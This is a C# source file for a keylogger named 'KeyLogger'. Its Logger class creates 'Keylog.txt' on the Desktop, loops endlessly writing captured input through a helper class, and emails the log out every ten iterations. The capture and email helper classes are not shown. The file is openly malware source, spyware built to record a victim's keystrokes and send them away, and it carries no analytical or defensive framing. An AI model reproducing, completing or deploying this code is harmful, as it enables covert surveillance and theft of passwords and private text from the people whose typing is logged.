using System;
using System.IO;
using System.Threading;

namespace KeyLogger
{
    class Logger
    {
        FileDecorator fileDecorator;
        EmailSender emailSender;
        string folderPath;
        string file;
        string fileName = "Keylog.txt";

        public Logger()
        {
            fileDecorator = new FileDecorator();
            emailSender = new EmailSender();
            folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            file = folderPath + @"\" + fileName;
        }

        public void Start()
        {
            fileDecorator.CreateFile();
            int charNumbers = default;

            while (true)
            {
                Thread.Sleep(5);
                file = fileDecorator.WriteFile();
                charNumbers++;

                if (charNumbers % 10 == 0)
                {
                    emailSender.SendMessage(file);
                }
            }
        }
    }
}

